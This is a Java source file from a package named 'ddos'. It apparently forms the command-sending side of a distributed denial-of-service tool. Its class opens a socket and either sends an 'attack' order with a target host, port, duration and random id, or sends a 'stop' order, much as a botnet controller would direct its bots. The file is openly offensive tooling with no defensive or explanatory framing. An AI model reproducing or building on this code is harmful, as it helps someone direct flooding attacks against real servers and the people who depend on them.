package ddos;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

class send implements Runnable {

	String host;
	int port, time;
	boolean d = false;
	Socket s;

	public send(String lhost, int lport, int ltime, Socket c) {
		host = lhost;
		port = lport;
		time = ltime;
		s = c;
		d = false;
	}

	public send(Socket c) {
		s = c;
		d = true;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub

		try {
			if (d)
				sendB();
			else
				sendA();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void sendA() throws Exception {
		// TODO Auto-generated method stub
		DataOutputStream out = new DataOutputStream(s.getOutputStream());
		out.writeUTF("attack");
		out.writeUTF(host);
		out.writeInt(port);
		out.writeInt(time);
		out.writeInt(newpid());
		out.flush();
//out.close();
		s.close();
	}

	private void sendB() throws IOException {
		// TODO Auto-generated method stub
		DataOutputStream out = new DataOutputStream(s.getOutputStream());
		out.writeUTF("stop");
		out.flush();
		s.close();
	}

	static int newpid() {
		return (int) (Math.random() * 100000);
	}

}